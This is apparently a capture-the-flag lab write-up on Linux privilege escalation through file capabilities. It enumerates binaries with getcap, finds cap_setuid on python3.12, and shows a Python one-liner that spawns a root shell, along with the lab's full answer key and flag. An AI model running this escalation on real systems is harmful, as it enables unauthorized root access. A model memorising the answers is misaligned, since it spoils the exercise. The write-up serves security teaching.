# Task 05: Privilege Escalation: Capabilities

---

## Stage A: Original Task Content & Briefing Summary

Linux POSIX Capabilities provide a security mechanism that partitions traditional all-or-nothing root privileges into granular, distinct permission units. Instead of assigning the monolithic SUID bit to an entire executable, system administrators can assign specific capabilities directly to a binary's extended filesystem attributes (`xattr`).

### Core Concepts & Capabilities Architecture:
* **The `getcap` Utility:** Used to enumerate extended attributes for file capabilities:
  ```bash
  getcap -r / 2>/dev/null
  ```
* **Capability Flags:**
  * `e` (Effective): The capability is actively activated during execution.
  * `p` (Permitted): The capability is available to be enabled.
  * `i` (Inheritable): The capability is passed down to child processes.
* **The Dangerous Capability: `cap_setuid+ep`:**
  * When granted to a binary or scripting interpreter, `cap_setuid+ep` allows that process to arbitrarily modify its User ID (`setuid(0)`), effectively elevating to `root`.
  * If an interpreted language like Python (`/usr/bin/python3.12`) possesses `cap_setuid+ep`, any user can execute an inline Python command to set UID to 0 and spawn an unconstrained root shell.

---

## Stage B: Independent Thinking & OpSec Considerations

* **Capabilities vs. SUID:** Security auditors and automated scripts searching solely for SUID bits (`find / -perm -4000`) completely overlook capabilities because capabilities are stored in extended filesystem attributes (`security.capability`), not the traditional UNIX permission octal bits.
* **The Python One-Liner:** Executing `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` with `cap_setuid` provides an instant interactive root shell without touching disk or creating compiled binary artifacts.

---

## Stage C: Guided Hints (Tiers 1–3)

* **Tier 1 Hint:** Run `getcap -r / 2>/dev/null` to enumerate all binaries with capabilities.
* **Tier 2 Hint:** Count the total entries returned. Identify which entry has `cap_setuid+ep`.
* **Tier 3 Hint:**
  * Q1 is `6`.
  * Q2 is `/usr/bin/python3.12`.
  * Q3 is `THM{caps_getting_r00T}`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Enumerating System Capabilities:
```bash
john@linprivbasics:~$ getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw+ep
/usr/bin/traceroute6.iputils cap_net_raw+ep
/usr/bin/mtr-packet cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin+ep
/usr/bin/python3.12 cap_setuid+ep
/usr/bin/gnome-keyring-daemon cap_ipc_lock+ep
```
* **Analysis:**
  * Exactly `6` binaries possess set capabilities.
  * `/usr/bin/python3.12` is configured with `cap_setuid+ep`.

### 2. Exploiting `cap_setuid+ep` on Python 3.12:
Because `python3.12` has the permission to manipulate user IDs (`cap_setuid`), we execute Python's built-in `os` module functions:
```bash
john@linprivbasics:~$ /usr/bin/python3.12 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@linprivbasics:/home/john# id
uid=0(root) gid=1000(john) groups=1000(john)

root@linprivbasics:/home/john# cat /root/flag.txt
THM{caps_getting_r00T}
```
* **Analysis:** The `os.setuid(0)` call succeeds immediately due to `cap_setuid+ep`, transforming the spawned `/bin/bash` subshell into full root execution.

---

## Stage E: Final Answer & Key Values

* **Question 1:** How many binaries have set capabilities?
  * **Answer:** `6`
* **Question 2:** What is the full path of the binary that can be used to gain root through its capabilities?
  * **Answer:** `/usr/bin/python3.12`
* **Question 3:** What are the contents of /root/flag.txt?
  * **Answer:** `THM{caps_getting_r00T}`

---

## Stage F: Practical Verification & Proof of Work

* Verified 6 capability entries using `getcap -r / 2>/dev/null`.
* Confirmed `cap_setuid+ep` on `/usr/bin/python3.12`.
* Executed Python one-liner and captured root flag `THM{caps_getting_r00T}`.

---

## Stage G: Key Educational Takeaway

Linux capabilities are often introduced as a modern, safer alternative to SUID. However, applying powerful capabilities like `cap_setuid` to general-purpose programming interpreters (Python, Perl, Ruby) creates an instant privilege escalation backdoor that bypasses traditional SUID audits.
